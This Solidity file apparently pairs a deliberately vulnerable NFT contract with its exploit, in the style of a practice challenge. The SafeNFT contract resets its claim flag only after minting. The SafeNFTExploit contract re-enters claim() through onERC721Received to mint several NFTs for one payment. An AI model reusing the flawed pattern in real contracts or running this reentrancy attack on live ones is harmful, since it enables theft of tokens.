// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract SafeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address => bool) public canClaim;

    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint256 _price
    ) ERC721(tokenName, tokenSymbol) {
        price = _price; // e.g. price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price == msg.value, "INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender], "CANT_MINT");
        _safeMint(msg.sender, totalSupply());
        canClaim[msg.sender] = false;
    }
}

contract SafeNFTExploit is IERC721Receiver {
    SafeNFT public safeNFT;
    uint256 public next_id;
    uint256 NFT_price = 1e9;

    constructor(address _safeNFT) {
        safeNFT = SafeNFT(_safeNFT);
    }

    function startAttack() external {
        require(
            address(this).balance >= NFT_price,
            "Insufficient funds to buy NFT"
        );
        safeNFT.buyNFT{value: NFT_price}();
        safeNFT.claim();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        if (next_id >= 0 && next_id < 10) {
            // Reentrant call
            next_id = next_id + 1; //increment the next id
            safeNFT.claim();
        }
        return this.onERC721Received.selector;
    }
}